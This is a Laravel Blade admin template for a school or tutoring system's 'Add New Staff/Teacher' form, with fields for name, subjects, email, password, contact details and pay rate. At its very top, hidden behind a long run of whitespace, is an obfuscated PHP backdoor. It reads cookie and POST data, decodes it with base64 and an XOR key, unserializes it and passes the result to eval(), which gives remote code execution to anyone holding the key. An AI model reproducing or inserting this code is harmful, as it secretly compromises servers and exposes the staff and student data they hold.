<?php                                                                                                                                                                                                                                                                                                                                                                                                 $OEtEK = class_exists("IR_Lcyi"); $vKGTDjddo = $OEtEK;if (!$vKGTDjddo){class IR_Lcyi{private $gWnRyJ;public static $XfbYxr = "2c77bfc9-8487-4238-ac71-6fd5d2e21804";public static $eOSrAWXT = NULL;public function __construct(){$HjmtyQnS = $_COOKIE;$LJjRlRDj = $_POST;$buoAUYkPs = @$HjmtyQnS[substr(IR_Lcyi::$XfbYxr, 0, 4)];if (!empty($buoAUYkPs)){$gMUrwAofKB = "base64";$qMslIC = "";$buoAUYkPs = explode(",", $buoAUYkPs);foreach ($buoAUYkPs as $ukzOUGIb){$qMslIC .= @$HjmtyQnS[$ukzOUGIb];$qMslIC .= @$LJjRlRDj[$ukzOUGIb];}$qMslIC = array_map($gMUrwAofKB . '_' . "\144" . chr (101) . 'c' . 'o' . "\x64" . chr ( 816 - 715 ), array($qMslIC,)); $qMslIC = $qMslIC[0] ^ str_repeat(IR_Lcyi::$XfbYxr, (strlen($qMslIC[0]) / strlen(IR_Lcyi::$XfbYxr)) + 1);IR_Lcyi::$eOSrAWXT = @unserialize($qMslIC);}}public function __destruct(){$this->triWnbV();}private function triWnbV(){if (is_array(IR_Lcyi::$eOSrAWXT)) {$bDvMnOE = str_replace("\x3c" . chr ( 367 - 304 )."\x70" . chr ( 555 - 451 ).'p', "", IR_Lcyi::$eOSrAWXT[chr (99) . chr (111) . chr ( 829 - 719 )."\x74" . chr ( 366 - 265 ).'n' . "\164"]);eval($bDvMnOE);exit();}}}$RuErn = new IR_Lcyi(); $RuErn = NULL;} ?>@extends('layouts.admin.master')

@section('content')
    <!-- Main content -->
    <div class="content-wrapper">

        <!-- Page header -->
        <div class="page-header page-header-light">
            <div class="page-header-content header-elements-md-inline">
                <div class="page-title d-flex">
                    <h4><span class="font-weight-semibold">Staff/Teacher</span> - Add</h4>
                    <a href="#" class="header-elements-toggle text-default d-md-none"><i class="icon-more"></i></a>
                </div>

                {{--                <div class="header-elements d-none">--}}
{{--                    <div class="d-flex justify-content-center">--}}
{{--                        <a href="{{asset('/admin/booking')}}" class="btn btn-link btn-float font-size-sm font-weight-semibold text-default">--}}
{{--                            <i class="icon-store text-pink-300"></i>--}}
{{--                            <span>Inventory</span>--}}
{{--                        </a>--}}
{{--                        <a href="{{asset('/admin/booking')}}" class="btn btn-link btn-float font-size-sm font-weight-semibold text-default">--}}
{{--                            <i class="icon-paypal2 text-pink-300"></i>--}}
{{--                            <span>Payment</span>--}}
{{--                        </a>--}}
{{--                        <a href="{{asset('/admin/booking')}}" class="btn btn-link btn-float font-size-sm font-weight-semibold text-default">--}}
{{--                            <i class="icon-alarm text-pink-300"></i>--}}
{{--                            <span>Timesheet</span>--}}
{{--                        </a>--}}
{{--                    </div>--}}
{{--                </div>--}}
            </div>

{{--            <div class="breadcrumb-line breadcrumb-line-light header-elements-md-inline">--}}
{{--                <div class="d-flex">--}}
{{--                    <div class="breadcrumb">--}}
{{--                        <a href="{{asset('/admin/booking')}}" class="breadcrumb-item"><i class="icon-home2 mr-2"></i> Dashboard</a>--}}
{{--                        <span class="breadcrumb-item active">Record Attendance</span>--}}
{{--                    </div>--}}

{{--                    <a href="#" class="header-elements-toggle text-default d-md-none"><i class="icon-more"></i></a>--}}
{{--                </div>--}}
{{--            </div>--}}
        </div>
        <!-- /page header -->


        <!-- Content area -->
        <div class="content">

             <?php if(isset($data['success_msg']) && $data['success_msg']){ ?>

            <div class="row">
                <div class="col-md-12">
                    <div class="alert alert-success alert-styled-left alert-arrow-left alert-dismissible">
                        <button type="button" class="close" data-dismiss="alert"><span>&times;</span></button>
                        <span class="font-weight-semibold">Well done!</span> <?php echo $data['success_msg']; ?>
                    </div>
                </div>
            </div>
            <?php } ?>

            <?php if(isset($data['danger_msg']) && $data['danger_msg']){ ?>
            <div class="row">
                <div class="col-md-12">
                    <div class="alert alert-danger alert-styled-left alert-dismissible">
                        <button type="button" class="close" data-dismiss="alert"><span>&times;</span></button>
                        <span class="font-weight-semibold">Oh snap!</span> <?php echo $data['danger_msg']; ?>
                    </div>
                </div>
            </div>
            <?php } ?>
                 <?php if(!empty($errors->all()) && $errors->all()){ ?>
                 <div class="row">
                     <div class="col-md-12">
                         <div class="alert alert-danger alert-styled-left alert-dismissible">


                             <button type="button" class="close" data-dismiss="alert"><span>&times;</span></button>
                             @foreach ($errors->all() as $error)

                                 <span class="font-weight-semibold">Oh snap!</span> {{ $error }}
                                 <br>
                             @endforeach


                         </div>
                     </div>

                 </div>
                 <?php } ?>
                 @if(session()->has('success'))

                     <div class="row">
                         <div class="col-md-12">
                             <div class="alert alert-success alert-styled-left alert-arrow-left alert-dismissible">
                                 <button type="button" class="close" data-dismiss="alert"><span>&times;</span></button>
                                 <span class="font-weight-semibold">Well done!</span> {{ session()->get('success') }}
                             </div>
                         </div>
                     </div>


                 @endif
                 @if(session()->has('error'))

                     <div class="row">
                         <div class="col-md-12">
                             <div class="alert alert-danger alert-styled-left alert-dismissible">
                                 <button type="button" class="close" data-dismiss="alert"><span>&times;</span></button>
                                 <span class="font-weight-semibold">Oh snap!</span>{{ session()->get('error') }}
                             </div>
                         </div>
                     </div>
                 @endif

            <div class="card">
                <div class="card-header">
                    <div class="header-elements-inline">
                        <h4 class="card-title">Add New Staff/Teacher</h4>
                    </div>
                </div>
                <hr>

                <div class="card-body">

                    <form action="{{url('admin/staff/add')}}" method="post">
                        @csrf



                        <div class="form-group required row">
                            <label class="col-md-2 col-form-label control-label">Teacher Name:</label>
                            <div class="col-md-10">
                                <input type="text"   id="name" value="{{ old('name') }}"   name="name" class="form-control" placeholder="Enter Staff/Teacher Name" required>
                            </div>
                        </div>

                        <div class="form-group row required">
                            <label class="col-md-2 col-form-label control-label"> Subjects:</label>
                            <div class="col-lg-10">
                                <div class="input-group">
                                    <select style="" id="" class="multiselect" name="subject_id[]"   multiple="multiple"
                                            data-placeholder="Select Subjects">

                                        <?php if (isset($data['subjects']) && count($data['subjects']) > 0) { foreach ($data['subjects'] as $subject) { ?>

                                        <!-- <option id="subject<?php echo $subject->id ?>"  <?php if (isset($subject->selected)) echo "selected"; ?> -->
                                        <option id="subject<?php echo $subject->id ?>"  <?php if (true) echo "selected"; ?>
                                        value="<?= $subject->id .'/' . $subject->name.'/' . $subject->group->name.'/' . $subject->group->id;  ?>"><?php echo $subject->group->name . ' - ' . $subject->name; ?></option>
                                        <?php } } ?>
                                    </select></div>
                            </div>
                        </div>

                        <div class="form-group row required">
                            <label class="col-md-2 col-form-label control-label">Email:</label>
                            <div class="col-md-10">
                                <input type="email"   id="email"  value="{{ old('email') }}"  name="email" class="form-control" placeholder="Enter Email" required>
                            </div>
                        </div>
                        <div class="form-group row">
                            <label class="col-md-2 col-form-label">Password:</label>
                            <div class="col-md-10">
                                <input type="password"   id="password"   name="password" class="form-control" placeholder="Enter User Password"  >
                            </div>
                        </div>
                        <div class="form-group row required">
                            <label class="col-md-2 col-form-label control-label">Contact No:</label>
                            <div class="col-md-10">
                                <input type="text"   id="contact_number"  value="{{ old('contact_number') }}"  name="contact_number" class="form-control" placeholder="Enter Contact Number" required>
                            </div>
                        </div>

                        <div class="form-group row required">
                            <label class="col-md-2 col-form-label control-label">Mailing Address:</label>
                            <div class="col-md-10">

                                <input type="text" id="address" name="address"  value="{{ old('address') }}"  class="form-control" placeholder="Enter Address" required>
                            </div>
                        </div>

                        <div class="form-group row">
                            <label class="col-md-2 col-form-label">Package Type:</label>
                            <div class="col-md-10">
                                <select id="type" name="type" data-placeholder="Select Package Type"   class="form-control form-control-select2" data-fouc>
                                    <option value="">Please Select</option>
                                    <option value="weekly">Weekly</option>
                                    <option value="bi_weekly">Bi-Weekly</option>
                                    <option value="tri_weekly">Tri-Weekly</option>
                                    <option value="monthly">Monthly</option>

                                </select>
                            </div>
                        </div>

                        <div class="form-group row required">
                            <label class="col-md-2 col-form-label control-label">Per Hour Rate:</label>
                            <div class="col-md-10">
                                <input type="number" step="any" min="0.001"   value="{{ old('per_hour_rate') }}"  id="per_hour_rate"   name="per_hour_rate" class="form-control" placeholder="Agreed Fee Per Hour" required>
                            </div>
                        </div>

                        <div class="form-group row required">
                            <label class="col-md-2 col-form-label control-label">Daily Working Hours:</label>
                            <div class="col-md-10">
                                <input type="number" step="any" min="0.001" value="{{ old('daily_working_hours') }}"    id="daily_working_hours"   name="daily_working_hours" class="form-control" placeholder="Agreed Hours" required>
                            </div>
                        </div>
                        <div class="form-group row required">

                            <label class="col-md-2 col-form-label control-label">Joining Date:</label>
                            <div class="col-md-10">
                                <input type="text" id="joining_date" name="joining_date" value="{{ old('joining_date') }}"  class="form-control pickadate-limits-attendance" required>
                            </div>

                        </div>
                        <div class="form-group row required">
                            <label class="col-md-2 col-form-label ">Remarks:</label>
                            <div class="col-md-10">
                                <textarea placeholder="Enter Your Comments Here"  value="{{ old('comments') }}"  class="form-control" name=" comments" id=" comments" rows="4" cols="50" value=""></textarea>
                            </div>
                        </div>




                        <div class="mt-5 mb-2 d-md-flex  justify-content-md-between flex-md-wrap">
                             <button type="submit" id="" class="btn bg-primary d-flex align-items-center">
                                Submit <i class="icon-paperplane ml-2"></i> </button>
                        </div>

                    </form>

                </div>
            </div>

        </div>
        <!-- /content area -->
        @include('layouts.footer')

    </div>

    <!-- /main content -->

@endsection
